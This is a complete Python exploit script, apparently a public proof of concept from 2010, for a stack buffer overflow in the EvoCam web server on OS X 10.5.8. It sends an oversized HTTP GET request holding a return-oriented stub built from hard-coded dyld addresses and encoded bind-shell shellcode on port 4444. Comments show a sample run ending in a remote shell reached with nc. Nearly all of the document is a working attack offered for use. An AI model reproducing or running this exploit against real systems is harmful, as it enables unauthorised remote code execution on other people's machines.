#!/usr/bin/python

# Exploit Title: OS X EvoCam Web Server Buffer Overflow Exploit 3.6.6 and 3.6.7
# Date: 1st June 2010
# Author: d1dn0t ( didnot __A-T__ me.com )
# Software Link: http://www.pizza.org/evocam.dmg
# Version: EvoCam 3.6.6 and 3.6.7
# Tested on: OS X 10.5.8 Intel

import socket
import sys
import struct
from optparse import OptionParser

# OS X EvoCam Web Server Buffer Overflow Exploit 3.6.6 and 3.6.7
# Tested on Leopard 10.5.8 Intel
# Paul Harrington didnot __A-T__ me.com
#
#$ ./evocam.py -H 192.168.1.28 -P 8080 -T 2
#EvoLogical EvoCam 3.6.6/7 on OS X 10.5.8 Intel HTTP Buffer Overflow Exploit
#didnot __A-T__ me.com
#Targeting EvoCam Version 3.6.7
#[+] Sending evil buffer...
#[+] Done!
#[*] Check your shell at 192.168.1.28:4444
#$ nc -v 192.168.1.28 4444
#Connection to 192.168.1.28 4444 port [tcp/krb524] succeeded!
#uname -a
#Darwin Leopard-VM.local 9.8.0 Darwin Kernel Version 9.8.0: Wed Jul 15 16:55:01 PDT 2009; root:xnu-1228.15.4~1/RELEASE_I386 i386

print "EvoLogical EvoCam 3.6.6/7 on OS X 10.5.8 Intel HTTP Buffer Overflow Exploit"
print "didnot __A-T__ me.com"

usage = "%prog -H TARGET_HOST -P TARGET_PORT -T Target "
parser = OptionParser(usage=usage)
parser.add_option("-H", "--target_host", type="string", action="store",
dest="HOST", help="Destination Host")
parser.add_option("-P", "--target_port", type="int", action="store",
dest="PORT", help="Destination Port")
parser.add_option("-T", "--target", type="string", action="store",
dest="TARGET", help="Target Version [1=3.6.6 2=3.6.7]")
(options, args) = parser.parse_args()
HOST = options.HOST
PORT = options.PORT

if options.TARGET == "1" :
     print "Targeting EvoCam Version 3.6.6"
     BUFLEN=1560
elif options.TARGET == "2" :
     print "Targeting EvoCam Version 3.6.7"
     BUFLEN=1308
else:
     BUFLEN=0

if not (HOST and PORT and BUFLEN):
     parser.print_help()
     sys.exit()

# Settings for Leopard 10.5.8
WRITEABLE = 0x8fe66448
SETJMP = 0x8fe1cf38 #$ nm /usr/lib/dyld | grep "setjmp" #8fe1cf38 t _setjmp
STRDUP = 0x8fe210dc #$ nm /usr/lib/dyld | grep "strdup" #8fe210dc t _strdup
JMPEAX = 0x8fe01041 #0x8fe01041 <__dyld__dyld_start+49>: jmp *%eax

NOP="\x90\x90"

buf = \
"\xdb\xd2\x29\xc9\xb1\x27\xbf\xb1\xd5\xb6\xd3\xd9\x74\x24" + \
"\xf4\x5a\x83\xea\xfc\x31\x7a\x14\x03\x7a\xa5\x37\x43\xe2" + \
"\x05\x2e\xfc\x45\xd5\x11\xad\x17\x65\xf0\x80\x18\x8a\x71" + \
"\x64\x19\x94\x75\x10\xdf\xc6\x27\x70\x88\xe6\xc5\x65\x14" + \
"\x6f\x2a\xef\xb4\x3c\xfb\xa2\x04\xaa\xce\xc3\x17\x4d\x83" + \
"\x95\x85\x21\x49\xd7\xaa\x33\xd0\xb5\xf8\xe5\xbe\x89\xe3" + \
"\xc4\xbf\x98\x4f\x5f\x78\x6d\xab\xdc\x6c\x8f\x08\xb1\x25" + \
"\xc3\x3e\x6f\x07\x63\x4c\xcc\x14\x9f\xb2\xa7\xeb\x51\x75" + \
"\x17\x5c\xc2\x25\x27\x67\x2f\x45\xd7\x08\x93\x6b\xa2\x21" + \
"\x5c\x31\x81\xb2\x1f\x4c\x19\xc7\x08\x80\xd9\x77\x5f\xcd" + \
"\xf6\x04\xf7\x79\x27\x89\x6e\x14\xbe\xae\x21\xb8\x93\x60" + \
"\x72\x03\xde\x01\x43\xb4\xb0\x88\x47\x64\x60\xd8\xd7\xd5" + \
"\x30\xd9\x1a\x55\x01\x26\xf4\x06\x21\x6b\x75\xac"

FRAG0 = "\x90" + "\x58" + "\x61" + "\xc3"
FRAG1 = "\x90" + "\x58" + "\x89\xe0" + "\x83\xc0\x0e" + "\x89\x44\x24\x08"
+ "\xc3" # 0C is a bad character

STUB = \
FRAG0 + \
struct.pack('<III',SETJMP,WRITEABLE+32,WRITEABLE) + \
FRAG1 + \
'A'*20 +\
struct.pack('<IIIII',SETJMP,WRITEABLE+24,WRITEABLE,STRDUP,JMPEAX) + \
'A'*4

BUFFER = "A"*BUFLEN + STUB + NOP + buf

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((HOST,PORT))
print '[+] Sending evil buffer...'
s.send("GET " +BUFFER + " HTTP/1.0\r\n\r\n")
print "[+] Done!"
print "[*] Check your shell at %s:4444 " % HOST
s.close()